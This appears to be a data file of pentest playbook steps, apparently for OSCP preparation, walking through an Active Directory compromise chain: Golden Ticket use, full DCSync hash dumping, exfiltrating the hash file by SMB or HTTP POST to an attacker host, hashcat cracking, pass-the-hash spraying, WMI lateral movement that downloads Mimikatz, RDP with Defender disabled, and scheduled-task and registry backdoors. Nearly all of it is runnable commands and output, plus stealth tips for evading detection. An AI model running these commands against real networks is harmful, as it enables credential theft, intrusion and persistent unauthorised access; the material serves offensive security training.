impacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-... -domain corp.com Administrator

2. Export:
export KRB5CCNAME=Administrator.ccache

3. Verify:
klist

4. Use:
impacket-psexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'

KALI-SPECIFIC KERBEROS NOTES:

Kerberos cache location:
- Default: /tmp/krb5cc_<UID>
- Custom: Specified via KRB5CCNAME
- Persistent: Copy .ccache file to permanent location

Multiple tickets:
- Can maintain multiple .ccache files for different users
- Switch: export KRB5CCNAME=/path/to/different.ccache

Kerberos configuration:
- Uses /etc/krb5.conf (configured in step 1)
- Must have correct realm and KDC settings

TROUBLESHOOTING:

Error: ""KDC_ERR_TGT_REVOKED"":
- krbtgt password changed (ticket invalidated)
- Solution: Re-compromise, extract new krbtgt hash, regenerate ticket

Error: ""KRB_AP_ERR_SKEW"":
- Time sync issue
- Solution: sudo ntpdate dc01.corp.com

Error: ""Cannot resolve KDC"":
- DNS issue
- Solution: Check /etc/resolv.conf points to DC

Error: ""Ticket expired"":
- Ticket past expiration time
- Solution: Regenerate with ticketer.py

ADVANTAGES OF KALI WORKFLOW:

- No Windows VM needed (save resources)
- No AV bypass required (ticketer.py on Kali, not Mimikatz on Windows)
- Persistent storage (save .ccache files indefinitely)
- Automation-friendly (scripted ticket creation and usage)
- No file transfers (everything on Kali)

OPSEC CONSIDERATIONS:

- Golden Ticket creation: Zero network traffic (local operation on Kali)
- Golden Ticket usage: No AS-REQ to KDC (no authentication event)
- Detection: Abnormal TGS-REQ patterns, unusual ticket lifetimes, tickets for disabled accounts
- Blue team indicators: TGT with 10-year lifetime, tickets from non-standard sources

TIME ESTIMATE: 5-10 minutes (ticket creation, export, validation).","",""
"verify-dcsync-access","Verify DCSync Permissions and Network Connectivity","Confirm account has replication rights and DC is accessible for full credential dump","PREREQUISITES: Full domain DCSync requires same permissions as single-user DCSync BUT generates significantly more traffic and takes longer.

REQUIRED PERMISSIONS:
(1) DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
(2) DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)

VERIFICATION TEST:
impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>'

SUCCESS: krbtgt hash retrieved → Rights confirmed, proceed to full dump.
FAILURE: ERROR_ACCESS_DENIED → Insufficient rights, cannot proceed.

NETWORK CONNECTIVITY:
sudo nmap -p 445,135,139,88 -Pn -v <DC_IP>

REQUIRED PORTS:
- 445/tcp (SMB) - Primary replication channel
- 135/tcp (RPC) - DRSUAPI endpoint
- 139/tcp (NetBIOS) - Legacy support
- 88/tcp (Kerberos) - Authentication

BANDWIDTH CONSIDERATION: Full DCSync transfers ENTIRE NTDS.DIT database over network.
Small domain (500 users) ≈ 50-100 MB transfer.
Large domain (5000 users) ≈ 500 MB - 1 GB transfer.
Estimate: ~10 KB per user account (includes password history, metadata).

OPSEC IMPACT ASSESSMENT:
- Full DCSync = MAXIMUM detection risk (sustained high-volume replication from non-DC)
- Blue team indicators: Large data transfer to non-DC IP, EventID 4662 (hundreds/thousands of events), network anomaly detection (unexpected replication traffic)
- TIMING: If stealth required, execute during maintenance windows or after-hours (less monitoring)
- ALTERNATIVE: If detection critical concern, use targeted DCSync (extract only high-value users) instead of full dump

TIME SYNCHRONIZATION:
sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>
Verify: date (confirm <5 min difference from DC time)

CRITICAL: Time sync prevents KRB_AP_ERR_SKEW errors during long DCSync operation.

TIME ESTIMATE: 3-5 minutes.","",""
"execute-full-dcsync","Extract All Domain Credentials via Full DCSync","Perform complete DCSync replication to extract NTLM hashes for all domain user accounts","FULL DCSYNC COMMAND (Impacket - RECOMMENDED):
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>' -outputfile domain_hashes

FLAGS EXPLAINED:
-just-dc-ntlm: Extract ONLY NTLM hashes (skip LM hashes, Kerberos keys - faster extraction, smaller output)
-outputfile domain_hashes: Save output to files with prefix 'domain_hashes'
  Creates: domain_hashes.ntds (NTLM hashes), domain_hashes.ntds.cleartext (if any cleartext passwords), domain_hashes.ntds.kerberos (Kerberos keys if not using -just-dc-ntlm)

ALTERNATIVE (Full extraction including Kerberos):
impacket-secretsdump -just-dc '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>' -outputfile full_dump
Use if you need Kerberos keys (AES128, AES256) for advanced attacks. SLOWER and LARGER output.

OUTPUT FORMAT (domain_hashes.ntds):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
dave:1104:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
john:1105:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
<...hundreds or thousands more users...>

FORMAT BREAKDOWN:
username:RID:LM_hash:NTLM_hash:::
         ^^^              ^^^^^^^^^ THIS IS WHAT WE NEED (32 hex characters)

EXTRACTION MONITORING:
Progress indicator: [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
                    [*] Using the DRSUAPI method to get NTDS.DIT secrets
                    <real-time hash output scrolling>

TIME ESTIMATES:
- Small domain (50-500 users): 2-5 minutes
- Medium domain (500-2000 users): 5-15 minutes  
- Large domain (2000-10000 users): 15-60 minutes

PROGRESS CHECK: Count hashes extracted so far:
wc -l domain_hashes.ntds
Example output: 2847 domain_hashes.ntds (2847 user accounts dumped)

OPSEC DETECTION:
- EventID 4662 generated for EVERY user extracted (hundreds to thousands of events)
- SIEM alerts: Sustained replication activity from non-DC IP
- Network monitoring: Large data transfer from DC to unknown system
- DC CPU spike during extraction (noticeable on resource-constrained DCs)

FAILURE RECOVERY:
If DCSync interrupted (network drop, timeout):
- Partial output saved to domain_hashes.ntds (keep existing file)
- Resume not supported - must restart full extraction
- Consider: Split extraction by OU if full dump repeatedly fails

FILE SIZE EXPECTATIONS:
500 users ≈ 50-100 KB .ntds file
2000 users ≈ 200-400 KB .ntds file
10000 users ≈ 1-2 MB .ntds file

CRITICAL: Verify file integrity after extraction:
cat domain_hashes.ntds | head -5 (verify format correct)
wc -l domain_hashes.ntds (verify count reasonable for domain size)

TIME ESTIMATE: 5-20 minutes (domain size dependent).","",""
"transfer-hash-database","Transfer Hash Database to Kali for Cracking","Move NTDS hash dump from extraction location to Kali system with Hashcat","SKIP IF: DCSync executed directly on Kali Linux (impacket-secretsdump).
Hashes already local - proceed to step 4 (batch-crack-hashes).

REQUIRED IF: DCSync executed on Windows system OR remote Linux box without Hashcat.

FILE TO TRANSFER: domain_hashes.ntds (primary file with NTLM hashes)
Optional: domain_hashes.ntds.cleartext (if any cleartext passwords found)

TRANSFER METHOD 1: IMPACKET SMB SERVER (RECOMMENDED for large files)

Kali setup:
sudo impacket-smbserver -smb2support -username transfer -password 'TransferPass123!' hashxfer /home/kali/loot

From Windows:
net use \\\\<KALI_IP>\\hashxfer /user:transfer TransferPass123!
copy domain_hashes.ntds \\\\<KALI_IP>\\hashxfer\
net use \\\\<KALI_IP>\\hashxfer /delete

From Linux:
smbclient //<KALI_IP>/hashxfer -U transfer%TransferPass123!
smb: \\> put domain_hashes.ntds
smb: \\> exit

TRANSFER METHOD 2: SCP (Linux to Linux)
scp domain_hashes.ntds kali@<KALI_IP>:/home/kali/loot/

TRANSFER METHOD 3: BASE64 ENCODE (No direct connectivity)

Source system:
base64 domain_hashes.ntds > hashes.b64
cat hashes.b64 (copy output)

Kali:
cat > hashes.b64 << 'EOF'
<paste Base64 content>
EOF
base64 -d hashes.b64 > domain_hashes.ntds

TRANSFER METHOD 4: HTTP POST (One-way exfiltration)

Kali listener:
python3 -m http.server 8000 --bind 0.0.0.0

Source system:
curl -X POST -F ""file=@domain_hashes.ntds"" http://<KALI_IP>:8000/upload
OR (Windows PowerShell):
Invoke-WebRequest -Uri http://<KALI_IP>:8000/upload -Method POST -InFile domain_hashes.ntds

Note: Requires simple HTTP upload handler - use SMB method if Python server insufficient.

FILE VALIDATION (CRITICAL):

On Kali:
ls -lh domain_hashes.ntds (verify file size matches source)
wc -l domain_hashes.ntds (verify hash count matches source)
head -5 domain_hashes.ntds (verify format: username:RID:LM:NTLM:::)

Expected format:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::

If format broken or corrupted:
- Re-transfer using different method
- Check for encoding issues (Windows line endings vs Unix)
- Verify no truncation during copy/paste (Base64 method)

HASH EXTRACTION (Prepare for Hashcat):

Hashcat requires ONLY NTLM hashes (not full secretsdump format):
cat domain_hashes.ntds | cut -d ':' -f 4 > ntlm_hashes.txt

Verify:
head -5 ntlm_hashes.txt
Expected output:
a9b30e5b0dc865eadcea9411e4ade72d
31d6cfe0d16ae931b73c59d7e0c089c0
08d7a47a6f9f66b97b1bae4178747494
<...pure NTLM hashes, one per line...>

FILE ORGANIZATION:
mkdir -p /home/kali/loot/dcsync_$(date +%Y%m%d)
cd /home/kali/loot/dcsync_$(date +%Y%m%d)
mv ~/domain_hashes.ntds .
mv ~/ntlm_hashes.txt .

TIME ESTIMATE: 1-3 minutes (depends on file size and transfer method).","",""
"batch-crack-hashes","Batch Crack NTLM Hashes with Hashcat Rule-Based Attack","Recover plaintext passwords from mass-extracted NTLM hashes using optimized wordlist and rule combinations","HASHCAT BATCH CRACKING STRATEGY: Prioritize speed and coverage. Use progressive attack complexity (fast attacks first, slower attacks if time permits).

ATTACK PHASE 1: STRAIGHT DICTIONARY (FASTEST - try first)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force --username

Flags:
-m 1000: NTLM hash mode
-a 0: Straight dictionary attack (no mutations)
--force: Suppress OpenCL warnings (required on Kali VM)
--username: Optional - preserves username:hash format if input has usernames

Time: 1-5 minutes on GPU, 10-30 minutes on CPU
Expected: 15-25% crack rate (common weak passwords: password, Password1, Welcome1, company name)

ATTACK PHASE 2: RULE-BASED ATTACK (RECOMMENDED - best balance)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Rule mutations applied by best64.rule:
- Capitalize first letter: password → Password
- All uppercase: password → PASSWORD
- Append numbers: password → password1, password123, password2023
- Leet speak: password → p@ssw0rd, p@55w0rd
- Reverse: password → drowssap
- Common substitutions: password → passw0rd, Pa$$word

Time: 10-30 minutes on GPU, 1-2 hours on CPU
Expected: 30-50% crack rate (corporate password patterns: Password1!, CompanyName2023, Welcome123)

ATTACK PHASE 3: ADVANCED RULES (If time permits)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force

Time: 30-90 minutes on GPU, 3-6 hours on CPU
Expected: Additional 5-15% crack rate (complex mutations)

ATTACK PHASE 4: HYBRID ATTACK (Append numbers to wordlist)
hashcat -m 1000 -a 6 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d --force

Appends all 4-digit combinations (0000-9999) to each wordlist entry.
Example: password → password0000, password0001, ..., password9999

Time: Hours to days (only use if extended time available)

MONITORING PROGRESS:
Press 's' key during cracking for status:
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit >> s

Status output:
Speed.........: 500.0 MH/s (GPU) OR 50.0 MH/s (CPU)
Recovered.....: 847/2450 (34.57%) Digests
Progress......: 14344384/14344384 (100.00%)
Remaining.....: 0 seconds

Cracked password location:
~/.hashcat/hashcat.potfile (automatically saved)

VIEW CRACKED PASSWORDS:
hashcat -m 1000 ntlm_hashes.txt --show --username

Output format:
a9b30e5b0dc865eadcea9411e4ade72d:Password123!
08d7a47a6f9f66b97b1bae4178747494:Welcome2023
<...hash:password pairs...>

EXTRACT USERNAMES AND PASSWORDS (For PTH spray):

Match cracked hashes back to usernames from domain_hashes.ntds:
grep -f <(hashcat -m 1000 ntlm_hashes.txt --show | cut -d ':' -f 1) domain_hashes.ntds > cracked_users.txt

Format output as username:password:
while read line; do
  user=$(echo $line | cut -d ':' -f 1)
  hash=$(echo $line | cut -d ':' -f 4)
  pass=$(grep ""^$hash:"" ~/.hashcat/hashcat.potfile | cut -d ':' -f 2-)
  echo ""$user:$pass""
done < cracked_users.txt > credentials.txt

Result (credentials.txt):
Administrator:Password123!
dave:Welcome2023
john:CompanyName1!
<...username:password pairs ready for validation...>

CRACKING OPTIMIZATION:
- GPU cracking MUCH faster (10-50x speedup) - use physical Kali install if available
- VM cracking acceptable for OSCP (time limits relaxed, smaller domains)
- Prioritize high-value accounts: Search for admin, svc, sql, web, backup usernames
- Stop after 50%+ crack rate - diminishing returns (remaining passwords likely strong)

FAILURE SCENARIOS:
- No cracks after 30 min straight dictionary → Passwords not in rockyou.txt (try larger wordlist: /usr/share/wordlists/kaonashi.txt, /usr/share/seclists/Passwords/)
- GPU errors → Use --force flag, verify GPU drivers (may need to use CPU mode)
- Out of memory → Split ntlm_hashes.txt into smaller batches (1000 hashes per file)

TIME ESTIMATE: 15-60 minutes (Phase 1-2 attacks, sufficient for OSCP exam).","",""
"spray-pass-the-hash","Spray Pass-the-Hash Across Subnet to Find Local Admin Access","Test all cracked NTLM hashes against target subnet to identify systems with local administrator privileges","PASS-THE-HASH SPRAY STRATEGY: Test NTLM hashes (both cracked and uncracked) against all domain-joined systems to discover where compromised users have local admin rights.

IMPORTANT: Can use NTLM hashes DIRECTLY (don't need plaintext passwords for PTH). However, cracked passwords help with RDP (step 8) and other services.

CRACKMAPEXEC PTH SPRAY (Multiple hashes, multiple targets):

METHOD 1: Hash-based spray (no passwords needed)
Extract usernames and hashes:
cat domain_hashes.ntds | grep -f <(cat credentials.txt | cut -d ':' -f 1) > targets.txt
Format: username:RID:LM:NTLM:::

Spray:
for line in $(cat targets.txt); do
  user=$(echo $line | cut -d ':' -f 1)
  hash=$(echo $line | cut -d ':' -f 4)
  crackmapexec smb 192.168.50.0/24 -u ""$user"" -H ""$hash"" -d corp.com --continue-on-success | tee -a spray_results.txt
done

METHOD 2: Direct command (single hash test - use for high-value accounts first)
crackmapexec smb 192.168.50.0/24 -u Administrator -H 'a9b30e5b0dc865eadcea9411e4ade72d' -d corp.com

Flags:
-u: Username
-H: NTLM hash (uppercase -H for hash, lowercase -h for host)
-d: Domain name
--continue-on-success: Test against ALL hosts (don't stop after first success)

OUTPUT ANALYSIS:

[+] 192.168.50.75   445   WS01   [+] corp.com\\dave:a9b30e5b (Pwn3d!)
                                                              ^^^^^^^^ LOCAL ADMIN ACCESS

[+] 192.168.50.80   445   WS02   [+] corp.com\\dave:a9b30e5b
                                                              (no Pwn3d!) = Valid creds, NOT admin

[-] 192.168.50.90   445   SRV01  [-] corp.com\\dave:a9b30e5b STATUS_LOGON_FAILURE
                                                              Invalid creds or account locked

KEY INDICATOR: (Pwn3d!) = User has local admin rights (can access ADMIN$ share).

DOCUMENT COMPROMISED SYSTEMS:
grep ""Pwn3d"" spray_results.txt > pwned_systems.txt

Example pwned_systems.txt:
192.168.50.75 - dave (Pwn3d!)
192.168.50.82 - john (Pwn3d!)
192.168.50.95 - Administrator (Pwn3d!)

PRIORITIZE TARGETS:
(1) Domain Controllers (if any Pwn3d - immediate Domain Admin equivalent)
(2) Server systems (SQL, Exchange, file servers - high-value data)
(3) Admin workstations (likely additional credentials in LSASS memory)
(4) Standard workstations (lower priority unless specific objective)

SPRAY OPTIMIZATION:

- Target /24 subnet (254 IPs): ~3-5 minutes per user hash
- Multiple /24 subnets: Parallelize with GNU parallel OR crackmapexec threading
- Large networks (>1000 hosts): Use crackmapexec database mode for tracking

OPSEC CONSIDERATIONS:

- PTH spray generates failed logon events (EventID 4625) for each unsuccessful attempt
- Successful PTH generates EventID 4624 (Logon Type 3 - Network)
- SIEM detection: Multiple failed logons from single source IP
- Account lockout: PTH failures count toward lockout threshold (typically 5-10 attempts)
- RATE LIMITING: Use --delay <SECONDS> to slow spray if lockout concern

Example with delay:
crackmapexec smb 192.168.50.0/24 -u dave -H 'hash' -d corp.com --delay 3
(3 second delay between each target - reduces detection and lockout risk)

FAILURE SCENARIOS:

- No (Pwn3d!) results: Compromised users are standard users (no local admin anywhere)
  → Try: (1) Crack more hashes (target admin/svc accounts), (2) Privilege escalation on standard access systems, (3) Kerberoasting for service accounts

- All STATUS_LOGON_FAILURE: Wrong domain, time sync issues, account lockouts
  → Verify: Domain name correct (-d flag), time synced (ntpdate), check individual account status

- Connection timeout: SMB port 445 filtered by firewall
  → Alternative: Try WinRM (port 5985) with crackmapexec winrm instead

TIME ESTIMATE: 5-15 minutes for /24 subnet with 10-20 users.","",""
"lateral-movement-wmiexec","Lateral Movement via WMI with Pass-the-Hash","Establish stealthy shell access on compromised systems using WMI-based Pass-the-Hash","WMIEXEC ADVANTAGES OVER PSEXEC:
- NO service creation (PSExec creates PSEXESVC service - loud and AV-detectable)
- NO file writes to ADMIN$ share (stealthier)
- Uses DCOM for semi-interactive shell (standard Windows management protocol)
- RECOMMENDED for domain controllers and high-security targets

IMPACKET WMIEXEC COMMAND:
impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>

Example:
impacket-wmiexec -hashes :a9b30e5b0dc865eadcea9411e4ade72d corp.com/dave@192.168.50.75

Format explanation:
-hashes :NTLM (colon before hash, no LM hash needed)
<DOMAIN>/<USERNAME>@<TARGET> (domain/user@targetIP or FQDN)

SUCCESSFUL CONNECTION:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>

SHELL COMMANDS:
whoami → Returns: corp\\dave (runs as authenticated user, NOT SYSTEM like PSExec)
hostname → Returns: WS01
ipconfig → Shows network configuration
net user dave /domain → Verify domain account details

HIGH-VALUE ACTIONS:

(1) CREDENTIAL HARVESTING:
Run Mimikatz via WMI:
C:\\> curl http://<KALI_IP>:8000/mimikatz.exe -o C:\\Windows\\Temp\\m.exe
C:\\> C:\\Windows\\Temp\\m.exe privilege::debug sekurlsa::logonpasswords exit

Expected: Plaintext passwords, NTLM hashes, Kerberos tickets from LSASS memory

(2) PERSISTENT ACCESS:
Create local admin account:
C:\\> net user hacker Passw0rd123! /add
C:\\> net localgroup Administrators hacker /add

(3) FILE EXFILTRATION:
Access C$ share from Kali:
smbclient //192.168.50.75/C$ -U 'corp.com/dave%:a9b30e5b0dc865eadcea9411e4ade72d' --pw-nt-hash
smb: \\> cd Users\\Administrator\\Desktop
smb: \\> get proof.txt

(4) PIVOTING:
Upload Chisel, ssf, or ligolo-ng for pivoting to internal networks

MULTIPLE TARGET WORKFLOW:

From pwned_systems.txt (step 6):
192.168.50.75 - dave (Pwn3d!)
192.168.50.82 - john (Pwn3d!)
192.168.50.95 - Administrator (Pwn3d!)

Iterate:
for target in 192.168.50.75 192.168.50.82 192.168.50.95; do
  echo ""[*] Accessing $target""
  # Execute non-interactive commands
  impacket-wmiexec -hashes :hash corp.com/user@$target ""whoami"" >> recon_$target.txt
  impacket-wmiexec -hashes :hash corp.com/user@$target ""ipconfig"" >> recon_$target.txt
  impacket-wmiexec -hashes :hash corp.com/user@$target ""net user"" >> recon_$target.txt
done

OPSEC NOTES:

- WMI executes commands via DCOM (EventID 4688 - Process Creation)
- Less suspicious than PSExec service (but still logged)
- BLUE TEAM DETECTION: Unusual processes spawned by wmiprvse.exe (WMI Provider Host)
- STEALTH: Use during business hours, execute common admin tasks (mimics legitimate behavior)

LIMITATIONS:

- Semi-interactive shell (not fully interactive like SSH)
- Some interactive programs won't work (e.g., can't run GUI apps)
- Output buffering (may not see real-time command output)
- Requires SMB (port 445) and RPC (port 135) access

ALTERNATIVES IF WMIEXEC FAILS:

(1) PSExec (louder but more reliable):
impacket-psexec -hashes :hash corp.com/user@target

(2) Atexec (scheduled task execution):
impacket-atexec -hashes :hash corp.com/user@target ""command""

(3) SMBExec (service-less execution via SMB):
impacket-smbexec -hashes :hash corp.com/user@target

FAILURE SCENARIOS:

- Access denied: User not local admin (recheck spray results - possible false positive)
- DCOM errors: DCOM disabled or firewalled (try PSExec instead)
- Connection timeout: RPC/SMB ports blocked

TIME ESTIMATE: 2-5 minutes per target (interactive access and initial recon).","",""
"rdp-high-value-targets","RDP Access to High-Value Systems with Cracked Credentials","Establish GUI access to prioritized targets using cracked plaintext passwords for interactive operations","RDP vs WMI TRADE-OFFS:
- WMI: Stealthier, command-line only, works with NTLM hashes
- RDP: GUI access, easier for manual tasks, requires plaintext passwords (or NLA bypass)

USE RDP WHEN:
(1) Need GUI access (e.g., accessing GUI-only applications, navigating unfamiliar systems)
(2) Manual file browsing (easier than command-line SMB)
(3) Screenshot/screen recording for proof (OSCP exam evidence)
(4) Accessing systems where command-line tools restricted

XFREERDP COMMAND (RECOMMENDED for Kali):
xfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET>:3389 /cert-ignore +clipboard /dynamic-resolution

Full example:
xfreerdp /u:dave /p:'Welcome2023' /d:corp.com /v:192.168.50.75:3389 /cert-ignore +clipboard /dynamic-resolution

Flags explained:
/u: Username (from credentials.txt - cracked passwords)
/p: Plaintext password (REQUIRED for RDP - cannot use NTLM hash without NLA bypass)
/d: Domain name
/v: Target IP:Port (default RDP port 3389)
/cert-ignore: Ignore certificate errors (self-signed certs common)
+clipboard: Enable clipboard sharing (copy/paste between Kali and target)
/dynamic-resolution: Auto-adjust RDP window to your screen size

OPTIONAL USEFUL FLAGS:
+drives: Mount local Kali drives in RDP session (\\\\tsclient\\drives\\)
/size:1920x1080: Set specific resolution
/drive:share,/home/kali/transfer: Mount specific local directory as share
/network:lan: Optimize for LAN connection (better performance)

ALTERNATIVE: RDESKTOP (Older tool, less features):
rdesktop -u dave -p Welcome2023 -d corp.com -r disk:share=/home/kali/transfer 192.168.50.75

PRIORITIZATION (From pwned_systems.txt and spray results):

(1) DOMAIN CONTROLLERS: Full domain control, SYSVOL/GPO access, AD database
(2) FILE SERVERS: Document shares, backup files, sensitive data
(3) DATABASE SERVERS (SQL): Database dumps, application credentials in configs
(4) ADMIN WORKSTATIONS: IT admin tools, cached credentials for multiple systems
(5) USER WORKSTATIONS: Lower priority (less sensitive data typically)

RDP WORKFLOW:

1. Connect:
xfreerdp /u:Administrator /p:'Password123!' /d:corp.com /v:192.168.50.95 /cert-ignore +clipboard

2. Initial actions:
- Open Command Prompt: Win+R → cmd
- Check privileges: whoami /all
- Disable Windows Defender (if admin): Set-MpPreference -DisableRealtimeMonitoring $true
- Check running processes: tasklist
- Check network connections: netstat -ano

3. File exfiltration:
- Browse to sensitive locations:
  C:\\Users\\Administrator\\Desktop
  C:\\Users\\*\\Documents
  \\\\DC01\\SYSVOL\\corp.com\\scripts (domain scripts, sometimes contain credentials)
- Copy files via clipboard (+clipboard flag) OR shared drives (+drives flag)

4. Credential harvesting:
- Transfer Mimikatz via shared drive or clipboard
- Run: mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > creds.txt
- Exfiltrate creds.txt

5. Screenshot evidence (OSCP exam):
- Win+PrntScr → Screenshots saved to Pictures/Screenshots
- OR: Use Kali screenshot tool (scrot, flameshot) to capture RDP window

CREDENTIAL MAPPING:

From credentials.txt (step 4 output):
Administrator:Password123!
dave:Welcome2023
john:CompanyName1!

From pwned_systems.txt (step 6 output):
192.168.50.95 - Administrator (Pwn3d!) → RDP: 192.168.50.95 (HIGH PRIORITY - Admin account)
192.168.50.75 - dave (Pwn3d!) → RDP: 192.168.50.75
192.168.50.82 - john (Pwn3d!) → RDP: 192.168.50.82

NLA (Network Level Authentication) ISSUES:

Modern Windows enables NLA by default - prevents RDP with NTLM hash (requires plaintext password).

If NLA error:
""The remote computer requires Network Level Authentication, which your computer does not support""

SOLUTION 1: Use cracked plaintext password (preferred - already done in step 4)
SOLUTION 2: Disable NLA remotely (requires admin access):
reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"" /v UserAuthentication /t REG_DWORD /d 0 /f
(Execute via wmiexec before RDP attempt)

SOLUTION 3: Use Restricted Admin mode (allows PTH for RDP - Windows 2012R2+):
xfreerdp /u:dave /pth:a9b30e5b0dc865eadcea9411e4ade72d /d:corp.com /v:192.168.50.75 +restricted-admin

OPSEC CONSIDERATIONS:

- RDP logon = EventID 4624 (Logon Type 10 - RemoteInteractive)
- More suspicious than WMI (Type 3 - Network)
- BLUE TEAM DETECTION: Unusual source IPs for RDP, off-hours access, admin RDP from workstation
- STEALTH: RDP during business hours, from IT-related IPs if possible

FAILURE SCENARIOS:

- Account not authorized for RDP: ""Remote Desktop Users"" group membership required
  → Fix: Add user remotely via wmiexec: net localgroup ""Remote Desktop Users"" dave /add

- RDP port 3389 blocked: Firewall or host-based filtering
  → Alternative: Port forward via compromised system OR use different access method (WMI)

- NLA authentication required: See NLA solutions above

- Connection timeout: RDP service not running OR port blocked
  → Enable remotely: reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f

TIME ESTIMATE: 5-10 minutes per high-value target (connection, recon, evidence gathering).","",""
"document-compromised-hosts","Document All Compromised Systems and Maintain Access","Create comprehensive inventory of compromised assets and establish persistence mechanisms","DOCUMENTATION REQUIREMENTS: Maintain detailed records of all compromised systems for exam reporting and operational tracking.

COMPROMISED SYSTEMS INVENTORY:

Create master spreadsheet/markdown table:

| IP Address      | Hostname | OS           | Access Method | User Account   | Admin Level | Credentials           | Notes                  |
|----------------|----------|--------------|---------------|----------------|-------------|-----------------------|------------------------|
| 192.168.50.75  | WS01     | Win10 Pro    | WMI/RDP       | dave           | Local Admin | dave:Welcome2023      | HR workstation         |
| 192.168.50.82  | WS02     | Win10 Ent    | WMI           | john           | Local Admin | john:CompanyName1!    | Dev workstation        |
| 192.168.50.95  | DC01     | Server 2019  | PSExec/RDP    | Administrator  | Domain Admin| Administrator:Pass123!| Domain Controller      |
| 192.168.50.100 | SQL01    | Server 2016  | WMI           | sqlsvc         | Local Admin | sqlsvc:SQLPass2023    | Database server        |

File: /home/kali/loot/dcsync_[date]/compromised_hosts.md

CREDENTIAL DATABASE:

Organize all extracted credentials:

/home/kali/loot/dcsync_[date]/
├── domain_hashes.ntds (original DCSync output - ALL users)
├── ntlm_hashes.txt (pure NTLM hashes for Hashcat)
├── credentials.txt (cracked username:password pairs)
├── spray_results.txt (crackmapexec PTH spray full output)
├── pwned_systems.txt (systems with local admin access)
├── compromised_hosts.md (detailed inventory table)
└── persistence_mechanisms.md (backup access methods)

BACKUP ACCESS METHODS:

Document multiple access paths to critical systems (in case primary method blocked):

(1) NTLM HASH ACCESS (survives password changes until hash rotation):
System: DC01 (192.168.50.95)
User: Administrator
NTLM Hash: a9b30e5b0dc865eadcea9411e4ade72d
Access: impacket-psexec -hashes :a9b30e5b0dc865eadcea9411e4ade72d corp.com/Administrator@192.168.50.95

(2) PLAINTEXT PASSWORD ACCESS:
System: SQL01 (192.168.50.100)
User: sqlsvc
Password: SQLPass2023
Access: xfreerdp /u:sqlsvc /p:'SQLPass2023' /d:corp.com /v:192.168.50.100 /cert-ignore

(3) CREATED LOCAL ACCOUNTS (if created during engagement):
System: WS01 (192.168.50.75)
User: hacker (created via WMI)
Password: Passw0rd123!
Access: RDP or WMI as hacker user

(4) GOLDEN TICKET (if created in parallel - ultimate persistence):
Domain: corp.com
krbtgt hash: [from domain_hashes.ntds]
Domain SID: [from DCSync output]
Access: See Golden Ticket chain for re-access procedure

PERSISTENCE MECHANISMS:

Optional - If extended access required:

(1) SSH BACKDOOR (via OpenSSH on Windows):
Via WMI/RDP on target:
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

Access: ssh dave@192.168.50.75

(2) SCHEDULED TASK BACKDOOR:
Via WMI:
schtasks /create /tn ""WindowsUpdate"" /tr ""C:\\Windows\\Temp\\backdoor.exe"" /sc onlogon /ru SYSTEM

(3) REGISTRY RUN KEY:
reg add ""HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"" /v Update /t REG_SZ /d ""C:\\Windows\\Temp\\backdoor.exe"" /f

REPORTING SUMMARY:

For exam report, document:

1. DCSYNC STATISTICS:
   - Total domain users: [from domain_hashes.ntds line count]
   - Hashes extracted: [total count]
   - Passwords cracked: [count] ([percentage]%)
   - Time taken: [total time from step 1-4]

2. LATERAL MOVEMENT SUCCESS:
   - Systems scanned: [IP range]
   - Systems with admin access: [count from pwned_systems.txt]
   - Systems compromised: [count from compromised_hosts.md]
   - Access methods used: WMI, PSExec, RDP

3. HIGH-VALUE TARGETS:
   - Domain Controllers: [list]
   - Database Servers: [list]
   - File Servers: [list]
   - Admin Workstations: [list]

4. CREDENTIALS HARVESTED:
   - Domain Admin accounts: [count]
   - Service accounts: [count]
   - User accounts: [count]
   - Total unique passwords: [count]

5. PERSISTENCE:
   - Golden Ticket: [Yes/No - if created]
   - Backup accounts: [count created]
   - Alternative access methods: [list]

EXAM PROOF:

Screenshots required:
- DCSync output (domain_hashes.ntds showing multiple users)
- Hashcat cracked passwords (hashcat --show output)
- crackmapexec spray results (showing Pwn3d! indicators)
